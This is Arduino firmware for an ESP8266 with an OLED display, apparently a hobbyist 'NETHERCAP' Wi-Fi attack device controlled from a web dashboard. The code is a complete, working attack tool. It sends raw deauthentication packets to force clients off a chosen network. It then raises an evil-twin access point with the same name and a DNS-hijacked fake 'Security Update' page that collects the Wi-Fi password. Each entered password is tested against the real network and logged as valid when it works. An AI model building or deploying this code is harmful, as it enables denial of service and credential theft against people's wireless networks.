#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
  #include "user_interface.h"
}

// Inisialisasi OLED 0.66"
Adafruit_SSD1306 display(64, 48, &Wire, -1);
ESP8266WebServer server(80);
DNSServer dnsServer;

// Variabel Kontrol
bool isAttacking = false, isETwin = false;
String target_ssid = "", logs = "";
uint8_t target_bssid[6];
int target_ch = 1, pwnCount = 0;
String apSSID = "GMpro", apPASS = "sangkur87";

// Raw Deauth Packet Template
uint8_t deauthPacket[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0,0,0,0,0,0, 0,0,0,0,0,0, 0x00, 0x00, 0x01, 0x00};

// --- OLED TAMPILAN PROFESIONAL ---
void updateOLED(String status) {
  display.clearDisplay();
  display.fillRect(0, 0, 64, 11, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(2, 2); display.print("NETHER-V10");
  if (millis() % 2000 > 1000) display.fillCircle(58, 5, 2, BLACK); // Blinker

  display.setTextColor(WHITE);
  display.setCursor(0, 15); display.print("TRG>"); 
  display.print(target_ssid == "" ? "IDLE" : target_ssid.substring(0, 6));

  for(int i=0; i<64; i+=4) display.drawFastHLine(i, 25, 2, WHITE); // Garis Putus-putus

  display.setCursor(0, 29); display.print("CH:"); 
  display.print(target_ch < 10 ? "0" : ""); display.print(target_ch);
  display.setCursor(35, 29); display.print("P:"); display.print(pwnCount);

  display.drawRoundRect(0, 38, 64, 10, 2, WHITE); // Border Status
  display.setCursor(4, 39); display.print(status.substring(0, 9));
  display.display();
}

// --- WEB DASHBOARD NETHERCAP STYLE ---
String getDashboard() {
  String s = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>";
  s += "<style>body{background:#000;color:#0f0;font-family:'Courier New',monospace;padding:10px;margin:0;}";
  s += ".header{border:1px solid #0f0;padding:10px;text-align:center;font-weight:bold;margin-bottom:10px;box-shadow:0 0 10px #0f0;}";
  s += ".console{border:1px solid #111;padding:10px;margin-bottom:10px;font-size:12px;}";
  s += ".btn{display:block;width:100%;padding:12px;margin:8px 0;background:#000;color:#0f0;border:1px solid #0f0;text-decoration:none;text-align:center;font-size:11px;cursor:pointer;}";
  s += ".btn:active, .active{background:#0f0;color:#000;} .danger{color:#f00;border-color:#f00;}";
  s += ".logs{background:#050505;color:#0f0;padding:8px;height:100px;overflow-y:auto;font-size:10px;border:1px solid #222;}</style></head><body>";
  s += "<div class='header'>[ NETHERCAP v10.0 ]</div>";
  s += "<div class='console'>TARGET_ID : " + (target_ssid==""?"NOT_SET":target_ssid) + "<br>CHANNEL   : " + String(target_ch) + "<br>STATUS    : " + (isAttacking?"ATTACKING":"IDLE") + "</div>";
  s += "<a href='/scan' class='btn'>[1] SCAN_NETWORKS</a>";
  s += "<a href='/atk' class='btn danger " + String(isAttacking?"active":"") + "'>[2] EXECUTE_DEAUTH</a>";
  s += "<a href='/et' class='btn " + String(isETwin?"active":"") + "'>[3] START_EVIL_TWIN</a>";
  s += "<div style='margin-top:10px;'>[ CAPTURED_LOGS ]</div><div class='logs'>" + (logs==""?"> listening...":logs) + "</div>";
  s += "</body></html>";
  return s;
}

void setup() {
  Serial.begin(115200);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, 0);
  dnsServer.start(53, "*", WiFi.softAPIP());
  updateOLED("READY");

  server.on("/", [](){ server.send(200, "text/html", getDashboard()); });

  server.on("/scan", []() {
    int n = WiFi.scanNetworks(false);
    String sc = "<html><body style='background:#000;color:#0f0;font-family:monospace;padding:15px;'>";
    sc += "<h3>[ SCAN_RESULTS ]</h3>";
    for(int i=0; i<n; i++) {
      sc += "<div style='border-bottom:1px solid #222;padding:10px;'>" + WiFi.SSID(i) + " (CH:" + String(WiFi.channel(i)) + ")";
      sc += "<br><a href='/sel?s=" + WiFi.SSID(i) + "&c=" + String(WiFi.channel(i)) + "&b=" + WiFi.BSSIDstr(i) + "' style='color:#fff;'>[SELECT_TARGET]</a></div>";
    }
    sc += "<br><a href='/' style='color:#0f0;'>[BACK]</a></body></html>";
    server.send(200, "text/html", sc);
  });

  server.on("/sel", []() {
    target_ssid = server.arg("s"); target_ch = server.arg("c").toInt();
    String b = server.arg("b");
    for (int i = 0; i < 6; i++) {
      target_bssid[i] = (uint8_t) strtol(b.substring(i*3, i*3+2).c_str(), NULL, 16);
      deauthPacket[10+i] = deauthPacket[16+i] = target_bssid[i];
    }
    updateOLED("LOCKED");
    server.sendHeader("Location", "/"); server.send(302);
  });

  server.on("/atk", []() { isAttacking = !isAttacking; updateOLED(isAttacking?"ATK_ON":"IDLE"); server.sendHeader("Location", "/"); server.send(302); });

  server.on("/et", []() {
    isETwin = !isETwin;
    if(isETwin && target_ssid != "") { WiFi.softAP(target_ssid.c_str(), "", 1, 0); updateOLED("ETWIN"); }
    else { WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, 0); updateOLED("READY"); }
    server.sendHeader("Location", "/"); server.send(302);
  });

  server.on("/l", []() {
    String p = server.arg("p");
    updateOLED("CHECK...");
    WiFi.begin(target_ssid.c_str(), p.c_str());
    unsigned long start = millis();
    bool v = false;
    while (millis() - start < 3500) { if (WiFi.status() == WL_CONNECTED) { v = true; break; } delay(100); }
    
    if (v) {
      logs = "> " + target_ssid + " : " + p + " [VALID]<br>" + logs;
      pwnCount++; isAttacking = false; isETwin = false;
      WiFi.disconnect(); WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, 0);
      updateOLED("SUCCESS");
      server.send(200, "text/html", "Success! Reconnecting...");
    } else {
      updateOLED("WRONG!");
      server.send(200, "text/html", "<html><script>alert('Incorrect Password!'); window.location='/';</script></html>");
    }
  });

  server.onNotFound([]() {
    if (server.hostHeader() == "192.168.4.1") { server.send(200, "text/html", getDashboard()); return; }
    String h = "<html><body style='text-align:center;padding-top:50px;'><h2>Security Update</h2><form action='/l'>";
    h += "<input type='password' name='p' placeholder='Password' required style='padding:10px;'><br><br><input type='submit' value='Verify'></form></body></html>";
    server.send(200, "text/html", h);
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  if (isAttacking && target_ssid != "") {
    wifi_set_channel(target_ch);
    for (int i = 0; i < 10; i++) { wifi_send_pkt_freedom(deauthPacket, 26, 0); delay(1); }
  }
}
